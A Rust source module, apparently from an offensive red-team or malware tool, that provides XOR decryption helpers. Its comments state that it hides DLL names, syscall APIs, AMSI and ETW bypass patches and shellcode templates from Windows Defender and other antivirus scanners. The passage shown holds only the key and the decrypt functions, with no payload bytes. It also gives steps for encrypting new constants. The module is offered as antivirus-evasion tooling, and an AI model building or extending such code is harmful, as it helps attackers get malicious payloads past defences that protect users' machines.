// Compile-time XOR obfuscation to defeat static AV signature scanning.
//
// All sensitive strings, API names, patch bytes, and shellcode templates are
// stored XOR-encrypted with key K. They're decrypted at runtime only when
// needed. This prevents the binary's .rodata section from containing plaintext
// signatures that Windows Defender and other AV engines scan for.
//
// ## Adding new encrypted constants
//
// 1. Choose the plaintext value (string, byte array, etc.)
// 2. XOR each byte with K (0x4B):
//    ```python
//    encrypted = [b ^ 0x4B for b in plaintext_bytes]
//    ```
// 3. Add as a `pub const` in this file
// 4. Use `s()` for strings, `b()` for byte vectors, `ba()` for fixed arrays,
//    `byte()` for single bytes
//
// ## What's encrypted here
//
// - DLL names: ntdll.dll, amsi.dll, kernel32.dll, user32.dll, ws2_32.dll, etc.
// - API function names: all Nt* syscall APIs, AMSI/ETW targets
// - Patch byte signatures: AMSI bypass patch, ETW ret patch
// - Syscall patterns: prologue (mov r10,rcx; mov eax,SSN), syscall;ret gadget
// - Shellcode templates: PEB walking code, find_function, get_data_ptr, etc.
//
// Display-only strings in help text and dry_run are NOT encrypted since they
// don't form the byte patterns AV engines match against.

const K: u8 = 0x4B;

/// Decrypt encrypted bytes to a String (for API names, DLL names).
pub fn s(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ K) as char).collect()
}

/// Decrypt encrypted bytes to a Vec<u8> (for shellcode templates, variable-length data).
pub fn b(enc: &[u8]) -> Vec<u8> {
    enc.iter().map(|&b| b ^ K).collect()
}

/// Decrypt encrypted fixed-size array (for patch bytes, syscall patterns).
pub fn ba<const N: usize>(enc: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    for i in 0..N {
        out[i] = enc[i] ^ K;
    }
    out
}

/// Decrypt a single encrypted byte.
pub fn byte(enc: u8) -> u8 {
    enc ^ K
}

